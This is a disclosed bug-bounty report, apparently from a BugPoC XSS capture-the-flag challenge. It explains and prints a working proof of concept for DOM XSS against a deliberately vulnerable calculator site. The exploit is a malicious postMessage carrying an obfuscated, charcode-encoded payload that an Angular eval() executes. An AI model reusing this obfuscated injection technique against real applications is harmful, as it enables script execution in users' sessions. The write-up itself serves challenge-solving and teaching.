{"id":953873,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTM4NzM=","url":"https://hackerone.com/reports/953873","title":"XSS Challenge #2 Solution","state":"Closed","substate":"resolved","severity_rating":"none","readable_substate":"Resolved","created_at":"2020-08-08T09:58:24.895Z","submitted_at":"2020-08-08T09:58:32.690Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bad5ect0r","url":"/bad5ect0r","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/b5CpkVVpEZUD9CLonarjqfbn/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":49074,"url":"https://hackerone.com/bugpoc","handle":"bugpoc","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/uu9HGr8oDden1RHaB9Da9GjM/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/uu9HGr8oDden1RHaB9Da9GjM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"BugPoC","twitter_handle":"bugpoc_official","website":"http://bugpoc.com","about":"A Platform to Build and Share Proof-of-Concepts for Bug Bounty Submissions, PenTest Deliverables, \u0026 Red Team Reports."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-12T15:11:31.797Z","bug_reporter_agreed_on_going_public_at":"2020-08-12T15:10:28.596Z","team_member_agreed_on_going_public_at":"2020-08-12T15:11:31.712Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nAn attacker can achieve arbitrary JavaScript execution in the context of the user's session on calc.buggywebsite.com. This is possible due to a weak origin check in the message event handler in http://calc.buggywebsite.com/frame.js as well as improper handling of the message data, allowing to to be inserted into the DOM without proper filtering.\n\n## Steps To Reproduce:\nPlease see the Bug Poc below. Note that I broke the exploit down into 2 manual clicks so that it is easier to understand what is happening at each stage. It still proves that XSS is possible by exploiting the vulnerable application.\n\n1. Include an iframe of the main site (`mriframe`).\n2. Click the `Click` button to perform stage 1 of the attack. This is where a malicious postMessage is sent to the vulnerable iframe. The iframe will include the HTML provided in the message. The HTML contains a bare minimum version of the calculator app including the Angular framework. It initializes a variable called `myText` with the value `\"alert(parent.location.hash)\"` and creates a single button that when clicked will set the `equation` variable to the value of `myText` and executes `calculate()`. `calculate` will then go and run `eval()` on the equation variable which ultimately results in the following being executed: `eval(alert(parent.location.hostname))`.\n3. Click the `AAAA` button to complete the exploit.\n\n## Supporting Material/References:\nhttps://bugpoc.com/poc#bp-cj7sT8rd (Password: `LArgELLaMa13`)\n\n### PoC Source\n\n```HTML\n\u003chtml\u003e\n    \u003cbody\u003e\n        \u003ciframe id=\"mrframe\" name=\"mrframe\" style=\"width:500px;height:700px\" src=\"http://calc.buggywebsite.com/\"\u003e\u003c/iframe\u003e\n        \u003cbr\u003e\n        \u003cbutton onclick=\"run()\" value=\"asdf\"\u003eClick\u003c/button\u003e\n        \u003cscript\u003e\n            function run() {\n                var a = document.getElementById('mrframe')\n                    .contentWindow\n                    .frames[0]\n                    .window;\n                a.postMessage('\u003ciframe name=ogiframe id=ogiframe srcdoc=\"\u003chtml\u003e\u003cbody ng-app=Calculator ng-cloak\u003e\u003cdiv ng-controller=ArthmeticController ng-init=myText=((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(108)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(114)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(40)+((![]+[])[+!+[]]).constructor.fromCharCode(112)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(114)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(46)+((![]+[])[+!+[]]).constructor.fromCharCode(108)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(99)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(105)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(46)+((![]+[])[+!+[]]).constructor.fromCharCode(104)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(115)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(109)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(41) class=container\u003e\u003cbutton ng-click=updateCurrNum(myText);calculate()\u003eAAAA\u003c/button\u003e\u003ciframe name=theiframe id=theiframe\u003e\u003c/iframe\u003e\u003c/div\u003e\u003cscript src=angular.min.js\u003e\u003c\\/script\u003e\u003cscript src=jquery.min.js\u003e\u003c\\/script\u003e\u003cscript src=script.js\u003e\u003c\\/script\u003e\u003c/body\u003e\u003c/html\u003e\"\u003e\u003c/iframe\u003e', '*');\n            }\n        \u003c/script\u003e\n    \u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Impact\n\nNone. This was just for fun! ðŸ˜Š","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eAn attacker can achieve arbitrary JavaScript execution in the context of the user\u0026#39;s session on calc.buggywebsite.com. This is possible due to a weak origin check in the message event handler in \u003ca title=\"http://calc.buggywebsite.com/frame.js\" href=\"/redirect?url=http%3A%2F%2Fcalc.buggywebsite.com%2Fframe.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://calc.buggywebsite.com/frame.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e as well as improper handling of the message data, allowing to to be inserted into the DOM without proper filtering.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003ePlease see the Bug Poc below. Note that I broke the exploit down into 2 manual clicks so that it is easier to understand what is happening at each stage. It still proves that XSS is possible by exploiting the vulnerable application.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eInclude an iframe of the main site (\u003ccode\u003emriframe\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eClick the \u003ccode\u003eClick\u003c/code\u003e button to perform stage 1 of the attack. This is where a malicious postMessage is sent to the vulnerable iframe. The iframe will include the HTML provided in the message. The HTML contains a bare minimum version of the calculator app including the Angular framework. It initializes a variable called \u003ccode\u003emyText\u003c/code\u003e with the value \u003ccode\u003e\u0026quot;alert(parent.location.hash)\u0026quot;\u003c/code\u003e and creates a single button that when clicked will set the \u003ccode\u003eequation\u003c/code\u003e variable to the value of \u003ccode\u003emyText\u003c/code\u003e and executes \u003ccode\u003ecalculate()\u003c/code\u003e. \u003ccode\u003ecalculate\u003c/code\u003e will then go and run \u003ccode\u003eeval()\u003c/code\u003e on the equation variable which ultimately results in the following being executed: \u003ccode\u003eeval(alert(parent.location.hostname))\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eClick the \u003ccode\u003eAAAA\u003c/code\u003e button to complete the exploit.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003e\u003ca title=\"https://bugpoc.com/poc#bp-cj7sT8rd\" href=\"/redirect?url=https%3A%2F%2Fbugpoc.com%2Fpoc%23bp-cj7sT8rd\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugpoc.com/poc#bp-cj7sT8rd\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (Password: \u003ccode\u003eLArgELLaMa13\u003c/code\u003e)\u003c/p\u003e\n\n\u003ch3 id=\"poc-source\"\u003ePoC Source\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;html\u0026gt;\n    \u0026lt;body\u0026gt;\n        \u0026lt;iframe id=\u0026quot;mrframe\u0026quot; name=\u0026quot;mrframe\u0026quot; style=\u0026quot;width:500px;height:700px\u0026quot; src=\u0026quot;http://calc.buggywebsite.com/\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\n        \u0026lt;br\u0026gt;\n        \u0026lt;button onclick=\u0026quot;run()\u0026quot; value=\u0026quot;asdf\u0026quot;\u0026gt;Click\u0026lt;/button\u0026gt;\n        \u0026lt;script\u0026gt;\n            function run() {\n                var a = document.getElementById(\u0026#39;mrframe\u0026#39;)\n                    .contentWindow\n                    .frames[0]\n                    .window;\n                a.postMessage(\u0026#39;\u0026lt;iframe name=ogiframe id=ogiframe srcdoc=\u0026quot;\u0026lt;html\u0026gt;\u0026lt;body ng-app=Calculator ng-cloak\u0026gt;\u0026lt;div ng-controller=ArthmeticController ng-init=myText=((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(108)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(114)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(40)+((![]+[])[+!+[]]).constructor.fromCharCode(112)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(114)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(46)+((![]+[])[+!+[]]).constructor.fromCharCode(108)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(99)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(105)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(46)+((![]+[])[+!+[]]).constructor.fromCharCode(104)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(115)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(109)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(41) class=container\u0026gt;\u0026lt;button ng-click=updateCurrNum(myText);calculate()\u0026gt;AAAA\u0026lt;/button\u0026gt;\u0026lt;iframe name=theiframe id=theiframe\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;script src=angular.min.js\u0026gt;\u0026lt;\\/script\u0026gt;\u0026lt;script src=jquery.min.js\u0026gt;\u0026lt;\\/script\u0026gt;\u0026lt;script src=script.js\u0026gt;\u0026lt;\\/script\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#39;, \u0026#39;*\u0026#39;);\n            }\n        \u0026lt;/script\u0026gt;\n    \u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eNone. This was just for fun! ðŸ˜Š\u003c/p\u003e\n","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-09-11T15:10:28.658Z","allow_singular_disclosure_after":-9389032.020077111,"singular_disclosure_allowed":true,"vote_count":14,"voters":["secator","mik317","0xelkomy","mygf","leonishan","3x3s","h4x0r-dz","tandav","zach075","yuvikepa","and 4 more..."],"severity":{"rating":"none","author_type":"User"},"structured_scope":{"databaseId":51128,"asset_type":"URL","asset_identifier":"*.buggywebsite.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8882826,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for participating in our XSS Challenge! Your solution is correct, however unfortunately the 1st, 2nd, and 3rd place prizes have already been claimed. But do not worry - **your name has been entered into a Raffle to win $100!** 6 random winners will be announced on **August 12th**. Stay tuned- we will re-open and award this submission if you win!\n\nReminder - the best blog write-up about this challenge will win $200! Submit yours on August 12th by tagging @bugpoc_official on Twitter.","markdown_message":"\u003cp\u003eThanks for participating in our XSS Challenge! Your solution is correct, however unfortunately the 1st, 2nd, and 3rd place prizes have already been claimed. But do not worry - \u003cstrong\u003eyour name has been entered into a Raffle to win $100!\u003c/strong\u003e 6 random winners will be announced on \u003cstrong\u003eAugust 12th\u003c/strong\u003e. Stay tuned- we will re-open and award this submission if you win!\u003c/p\u003e\n\n\u003cp\u003eReminder - the best blog write-up about this challenge will win $200! Submit yours on August 12th by tagging \u003ca href=\"/bugpoc_official\"\u003e@bugpoc_official\u003c/a\u003e on Twitter.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-08T12:33:42.721Z","updated_at":"2020-08-08T12:33:42.721Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"bad5ect0r","url":"/bad5ect0r"},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8882839,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Do you know what time zone? When it's the 12th in Australia it would still be the 11th in the US. ","markdown_message":"\u003cp\u003eDo you know what time zone? When it\u0026#39;s the 12th in Australia it would still be the 11th in the US. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-08T12:37:33.519Z","updated_at":"2020-08-08T12:37:33.519Z","actor":{"username":"bad5ect0r","cleared":false,"url":"/bad5ect0r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/b5CpkVVpEZUD9CLonarjqfbn/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8882845,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Good point! We will pick the best blog Aug 13th ~10AM EDT. Just submit it sometime before then :)","markdown_message":"\u003cp\u003eGood point! We will pick the best blog Aug 13th ~10AM EDT. Just submit it sometime before then :)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-08T12:39:58.166Z","updated_at":"2020-08-08T12:39:58.166Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8916859,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"Thanks again for participating in our challenge. This CTF was a ton of fun to make and we hope you enjoyed completing it. Unfortunately your solution was not chosen in the random raffle. Stay tuned- we plan on doing another CTF soon! Happy hacking!","markdown_message":"\u003cp\u003eThanks again for participating in our challenge. This CTF was a ton of fun to make and we hope you enjoyed completing it. Unfortunately your solution was not chosen in the random raffle. Stay tuned- we plan on doing another CTF soon! Happy hacking!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T14:41:20.392Z","updated_at":"2020-08-12T14:41:20.392Z","actor":{"url":"/bugpoc","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/uu9HGr8oDden1RHaB9Da9GjM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"BugPoC"}},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8917217,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"No worries. Would you mind allowing disclosure? ","markdown_message":"\u003cp\u003eNo worries. Would you mind allowing disclosure? \u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T15:10:28.624Z","updated_at":"2020-08-12T15:10:28.624Z","first_to_agree":true,"actor":{"username":"bad5ect0r","cleared":false,"url":"/bad5ect0r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/b5CpkVVpEZUD9CLonarjqfbn/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8917231,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Definitely! Great job with your solution!","markdown_message":"\u003cp\u003eDefinitely! Great job with your solution!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T15:11:31.735Z","updated_at":"2020-08-12T15:11:31.735Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8917232,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-12T15:11:31.818Z","updated_at":"2020-08-12T15:11:31.818Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}